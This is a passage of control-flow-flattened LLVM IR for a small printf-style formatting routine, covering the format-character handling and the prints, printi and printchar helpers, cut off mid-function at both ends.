  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 1480627511, i32 -1974350548
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 1653308194, i32 1420224410
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 407025709, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 407025709, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 365473494, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -1251379524, i32 -1896772492
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 1547444919, i32 -1859498537
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 -772947893, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 -772947893, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 365473494, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 -938149526, i32 -2117021526
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 -981167582, i32 1022587148
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 1027353878, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 1027353878, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 365473494, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 -917163413, i32 -817296466
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 530778107, i32 -1389978823
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 2104083858, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 2104083858, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 365473494, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 1113630321, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 -2010345333, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 1113630321, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 365473494, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 948353959, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 -554221082, i32 -90327994
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 -90327994, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -639731295, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -639731295, label %first
    i32 897330630, label %16
    i32 1227795123, label %18
    i32 1442264895, label %23
    i32 -112522220, label %26
    i32 -1674532328, label %29
    i32 681870637, label %34
    i32 1600442617, label %35
    i32 1448177825, label %39
    i32 1488336555, label %44
    i32 264020800, label %45
    i32 -1243139557, label %46
    i32 1614383043, label %51
    i32 -418819170, label %52
    i32 -1401509000, label %56
    i32 1915353651, label %61
    i32 1099791844, label %64
    i32 1898167171, label %65
    i32 1960343683, label %66
    i32 642509954, label %71
    i32 1415359280, label %78
    i32 -745102588, label %81
    i32 1486327599, label %82
    i32 -215347804, label %86
    i32 1168980888, label %91
    i32 1086238175, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 897330630, i32 -1243139557
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 1227795123, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 1442264895, i32 -1674532328
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -112522220, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 1227795123, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 681870637, i32 1600442617
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 1448177825, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 1448177825, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 1488336555, i32 264020800
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 264020800, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1243139557, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 1898167171, i32 1614383043
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -418819170, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 -1401509000, i32 1099791844
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 1915353651, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 -418819170, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 1898167171, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 1960343683, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 642509954, i32 -745102588
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 1415359280, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 1960343683, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 1486327599, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 -215347804, i32 1086238175
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 1168980888, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 1486327599, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 744528461, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 744528461, label %first
    i32 1804492220, label %26
    i32 540717092, label %34
    i32 1047173591, label %38
    i32 -142621334, label %42
    i32 -445611098, label %46
    i32 895644349, label %49
    i32 -68143441, label %54
    i32 -731417131, label %58
    i32 -1860019750, label %65
    i32 940547324, label %71
    i32 395737151, label %80
    i32 -2602420, label %84
    i32 -1687066239, label %88
    i32 457483349, label %93
    i32 25285469, label %99
    i32 -1879883773, label %102
    i32 340284857, label %103
    i32 -109545349, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 1804492220, i32 540717092
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 -109545349, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 1047173591, i32 895644349
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 -142621334, i32 895644349
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 -445611098, i32 895644349
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 895644349, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 -68143441, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 -731417131, i32 395737151
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 -1860019750, i32 940547324
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 940547324, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 -68143441, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -2602420, i32 340284857
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -1687066239, i32 25285469
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 457483349, i32 25285469
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 -1879883773, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 -1879883773, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 340284857, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 -109545349, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 -1600673562, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1600673562, label %first
    i32 1486019446, label %8
    i32 340752077, label %16
    i32 815815919, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
